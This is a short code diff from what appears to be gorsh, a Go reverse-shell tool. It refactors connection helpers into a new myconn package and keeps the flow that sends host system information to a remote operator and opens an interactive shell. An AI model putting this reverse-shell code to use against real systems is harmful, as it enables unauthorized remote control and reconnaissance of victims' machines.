@@ -14,6 +14,7 @@ import (
 	"github.com/abiosoft/readline"
 
 	"github.com/audibleblink/gorsh/internal/cmds"
+	"github.com/audibleblink/gorsh/internal/myconn"
 	"github.com/audibleblink/gorsh/internal/sitrep"
 )
 
@@ -28,18 +29,7 @@ var (
 	fingerPrint   string
 )
 
-type writer interface {
-	Write(s []byte) (int, error)
-	Read(s []byte) (int, error)
-	Close() error
-}
-
-func send(conn writer, msg string) {
-	conn.Write([]byte(msg))
-	conn.Write([]byte("\n"))
-}
-
-func startShell(conn writer) {
+func startShell(conn myconn.Writer) {
 	hostname, _ := os.Hostname()
 
 	sh := ishell.NewWithConfig(&readline.Config{
@@ -52,7 +42,7 @@ func startShell(conn writer) {
 	})
 
 	cmds.RegisterCommands(sh)
-	send(conn, sitrep.SysInfo())
+	myconn.Send(conn, sitrep.SysInfo())
 	sh.Run()
 	os.Exit(0)
 }
@@ -81,6 +71,8 @@ func initReverseShell(connectString string, fingerprint []byte) {
 	if !ok {
 		os.Exit(ErrBadFingerprint)
 	}
+
+	myconn.Conn = conn
 	startShell(conn)
 }
 
